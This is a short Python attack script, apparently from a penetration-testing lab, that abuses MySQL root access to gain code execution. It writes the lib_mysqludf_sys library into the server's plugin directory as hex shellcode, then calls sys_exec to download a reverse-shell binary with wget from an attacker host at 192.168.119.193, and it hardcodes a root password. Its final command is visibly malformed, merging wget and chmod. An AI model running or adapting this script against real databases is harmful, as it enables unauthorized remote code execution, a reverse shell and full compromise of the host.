#!/usr/bin/env python3

# Make sure that port forwarding has been set up 443 -> 4444, and that a payload is available 
# locally via http.

import os

password = 'BmDu9xUHKe3fZi3Z7RdMBeb'

shellcode_file = open("lib_mysqludf_sys.so.hex",'r')
shellcode = shellcode_file.read()

def issuecommand(password, command):
    cmdstring = "mysql --host=127.0.0.1 --port=13306 -uroot -p" + password + " -e \"" + command + "\""
    print("Executing: " + cmdstring)
    os.system(cmdstring)

issuecommand(password, "set @shell = 0x" + shellcode)
issuecommand(password, "select binary @shell into dumpfile \'/home/dev/plugin/udf_sys_exec.so\';")
issuecommand(password, "select sys_exec(\'wget http://192.168.119.193/shell999.elf\');")
issuecommand(password, "select sys_exec(\'wget http://192.168.119.193/chmod +x ./shell999.elf\');")






